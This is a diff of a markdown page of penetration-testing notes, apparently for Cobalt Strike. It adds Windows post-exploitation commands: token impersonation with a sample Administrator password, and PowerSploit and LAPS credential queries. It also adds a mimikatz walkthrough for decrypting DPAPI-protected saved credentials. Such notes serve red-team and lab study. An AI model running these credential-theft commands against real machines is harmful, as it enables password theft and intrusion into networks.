@@ -40,7 +40,6 @@ powershell-import /opt/PowerSploit/Exfiltration/Get-GPPPassword.ps1
 powershell Get-GPPPassword
 
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
-
 ```
 
 Note: Great cheat sheets for powerview, powerup,powersploit, etc.
@@ -73,17 +72,56 @@ powershell Find-AdmPwdExtendedRights
 powershell Get-LAPSComputers
 ```
 
-https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/
+[https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/](https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/)
 
-https://www.pentestgeek.com/penetration-testing/another-lap-around-microsoft-laps 
+[https://www.pentestgeek.com/penetration-testing/another-lap-around-microsoft-laps](https://www.pentestgeek.com/penetration-testing/another-lap-around-microsoft-laps)
 
 **Token Notes:**
 
-You can create a token and pass to obtain a shell when not in elevated process. Additionally, only psexec / psexec\_psh work with make\_token, not winrm or wmi
+You can create a token and pass to obtain a shell when not in elevated process. Additionally, only psexec/psexec\_psh work with make\_token, not winrm or wmi
 
+```
+make_token .\Administrator P@ssw0rd
+ls \\dc01\c$
+```
 
+**Credential Manager & DPAPI:**
+
+If assume / know the machine is used for RDP, there might be saved credentials.
+
+```
+shell vaultcmd /listcreds:"Windows Credentials" /all
+```
+
+These credentials are stored within the users directory,:
+
+```
+powershell Get-ChildItem C:\Users\<User>\AppData\Local\Microsoft\Credentials\ -Force
+```
+
+Take the output from above command to get details
+
+```
+mimikatz dpapi::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Credentials\<File Name from above command>
+```
+
+Get the Masterkey from cache
+
+```
+mimikatz !sekurlsa::dpapi
+```
+
+Obtain password
+
+```
+mimikatz dpapi::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Credentials\<File Name from earlier command> /masterkey:<key from above command>
+```
+
+**Resources:**
+
+https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
 
 [http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/](https://legacy.gitbook.com/book/d00mfist1/ctf/edit#)
 
-https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powerview.html
+[https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powerview.html](https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powerview.html)
 
